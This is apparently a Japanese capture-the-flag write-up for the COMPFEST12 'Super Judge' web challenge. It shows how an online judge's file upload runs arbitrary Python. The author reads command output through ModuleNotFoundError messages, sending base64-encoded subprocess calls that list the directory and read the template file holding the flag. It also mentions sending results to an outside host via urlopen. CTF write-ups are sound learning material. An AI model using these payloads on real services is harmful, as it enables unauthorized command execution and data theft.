# Super Judge:Web:757pts
We tried to recreate competitive programming online judge for python only, but failed miserably, and by miserably, fatal failure. What's the bug? see if you can find it out!  
128.199.157.172:25000  
Alternate download link:  
[https://drive.google.com/file/d/1dsOq6DGnKRXuh0-bLUJ5m8WqO_ajSCs_/view?usp=sharing](https://drive.google.com/file/d/1dsOq6DGnKRXuh0-bLUJ5m8WqO_ajSCs_/view?usp=sharing)  
[super-judge.zip](super-judge.zip)  

# Solution
アドレスへアクセスすると以下のようなページだった。  
CTF Bonline Judge  
[site1.png](site/site1.png)  
ファイルをアップロードするとそこに書かれた数字をpythonが足すようだ。  
配布されているzipの中身には以下のhtmlが入っていた。  
```html
~~~
  <div class="container text-center content">
    {% if user.is_superuser %}
      <p>Hello, admin. Submission received!</p>
      <p>Here's the flag : REDACTED.</p>
    {% else %}
      <p>Hello, ordinary visitor. Submission received!</p>
    {% endif %}
  </div>
~~~
```
フラグが直で書かれているようなので、このファイルを取得することを目指す。  
admin以外の計算結果では`Hello, ordinary visitor. Submission received!`となるようだ。  
以下のようなa.txtをアップロードするがエラーが出なかった。  
```text:a.txt
100
print(123)
```
Python Emulator  
[site2.png](site/site2.png)  
つまり任意のpythonコードを実行できる。  
結果を外部に渡してやるのも一つの解法ではある(`__import__("urllib.request").request.urlopen`などで)。  
今回はエラーから実行結果を読み取ることができた。  
エラーは以下のb.txtで引き起こせる。  
```text:b.txt
100
__import__("hackhack")
```
ModuleNotFoundError at /  
[site3.png](site/site3.png)  
モジュール名が表示されている。  
このモジュール名にコード実行の結果を持ってこればよい。  
全文表示するためbase64をかませた。  
```text:c.txt
100
__import__(str(__import__("base64").b64encode(str(__import__("subprocess").check_output(["ls","-la","."])).encode())))
```
これによりError1.htmlが得られるので、デコードを行うと以下になる。  
```text
total 212
drwxr-xr-x 1 compfest12 compfest12   4096 Sep  7 09:15 .
drwxr-xr-x 1 root       root         4096 Sep  5 05:26 ..
-rw------- 1 compfest12 compfest12    308 Sep  7 09:20 .bash_history
-rw-r--r-- 1 compfest12 compfest12    220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 compfest12 compfest12   3771 Feb 25  2020 .bashrc
drwxrwxr-x 1 compfest12 compfest12   4096 Sep  5 06:00 .git
-rw-rw-r-- 1 compfest12 compfest12    679 Sep  5 06:00 .gitignore
-rw-r--r-- 1 compfest12 compfest12    807 Feb 25  2020 .profile
-rw-rw-r-- 1 compfest12 compfest12    534 Sep  5 06:00 Dockerfile
-rw-r--r-- 1 compfest12 compfest12 131072 Sep  7 09:15 db.sqlite3
-rw-rw-r-- 1 compfest12 compfest12    138 Sep  5 10:30 docker-compose.yml
drwxrwxr-x 1 compfest12 compfest12   4096 Sep  7 02:39 home
-rw-rw-r-- 1 compfest12 compfest12    629 Sep  5 06:00 manage.py
-rw-rw-r-- 1 compfest12 compfest12    198 Sep  5 06:00 payload.py
drwxrwxr-x 1 compfest12 compfest12   4096 Sep  7 02:39 pemulator
-rw-rw-r-- 1 compfest12 compfest12    532 Sep  5 06:00 readme.md
-rw-rw-r-- 1 compfest12 compfest12     86 Sep  5 06:00 requirements.txt
-rwxr-xr-x 1 compfest12 compfest12    160 Sep  5 10:30 run.sh
drwxrwxr-x 1 compfest12 compfest12   4096 Sep  5 06:00 templates
```
配布されているzipからファイル名がわかる。  
templates/result.htmlをcatすれば良い。  
```text:hack.txt
100
__import__(str(__import__("base64").b64encode(str(__import__("subprocess").check_output(["cat","templates/result.html"])).encode())))
```
これによりError2.htmlが得られるので、デコードを行うと以下になる。  
```html
~~~
  <div class="container text-center content">
    {% if user.is_superuser %}
      <p>Hello, admin. Submission received!</p>
      <p>Here\'s the flag : COMPFEST12{f4k3_5up312_u53r_hUH_?}.</p>
    {% else %}
      <p>Hello, ordinary visitor. Submission received!</p>
    {% endif %}
  </div>
~~~
```
flagが書かれている。  

## COMPFEST12{f4k3_5up312_u53r_hUH_?}